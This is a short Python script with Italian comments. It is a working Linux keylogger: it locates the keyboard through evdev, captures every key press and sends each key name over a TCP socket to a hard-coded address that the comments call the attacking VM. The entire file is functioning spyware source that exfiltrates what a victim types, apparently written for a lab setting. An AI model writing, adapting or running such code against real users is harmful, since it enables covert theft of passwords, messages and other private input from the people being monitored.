import socket
import evdev
from evdev import InputDevice, categorize, ecodes

# Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
SERVER_IP = '192.168.1.190'
SERVER_PORT = 1235

# Crea la connessione socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER_IP, SERVER_PORT))

# Trova il dispositivo di input della tastiera
devices = [InputDevice(path) for path in evdev.list_devices()]
keyboard_device = None
for device in devices:
    if ecodes.EV_KEY in device.capabilities():
        keyboard_device = device
        break

if not keyboard_device:
    print("Nessun dispositivo di input della tastiera trovato.")
    sock.close()
    exit(1)

print(f"Dispositivo della tastiera trovato: {keyboard_device.path}")

# Funzione per mappare i codici dei tasti ai caratteri
def get_key_name(keycode):
    try:
        return ecodes.KEY[keycode]
    except KeyError:
        return f"[UNKNOWN:{keycode}]"

# Leggi gli eventi della tastiera
try:
    for event in keyboard_device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                key_name = get_key_name(key_event.keycode)
                # Invia il carattere al server
                sock.sendall(key_name.encode('utf-8'))
except KeyboardInterrupt:
    print("\nInterruzione manuale da tastiera.")
finally:
    # Chiude la connessione socket
    sock.close()



